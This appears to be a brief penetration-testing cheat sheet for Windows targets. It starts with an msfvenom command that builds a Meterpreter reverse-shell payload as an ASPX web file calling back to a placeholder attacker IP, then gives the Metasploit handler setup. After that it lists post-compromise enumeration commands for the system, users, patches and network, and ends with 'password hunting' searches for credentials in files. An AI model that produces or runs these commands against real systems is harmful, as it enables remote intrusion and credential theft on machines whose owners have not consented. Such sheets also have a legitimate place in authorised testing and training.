# Metasploit Windows Reverse Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
```

# Windows System Enumeration 
```
systeminfo

systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"

wmic qfe

wmic qfe Caption,Description,HotFixID,InstalledOn

wmic logicaldisk

wmic logicaldisk get caption,description,providername

wmic logicaldisk get caption
```

# Windows User Enumeration 
```
whoami

whoami /priv

whoami /groups

net user

net user jack

net localgroup

net localgroup administrators
```

# Windows Network Enumeration 
```
ipconfig

ipconfig /all

#Check Incoming / Outgoing Network Traffic
arp -a

#Check route table
route print

#Check open ports
netstat -ano
```

# Windows Password Hunting
```
#find 'password' in current directory with extension of txt,ini and config
findstr /si password *.txt *.ini *.config

#find 'password' in whole C: directory
dir /s C:\* | findstr /i "password"

```
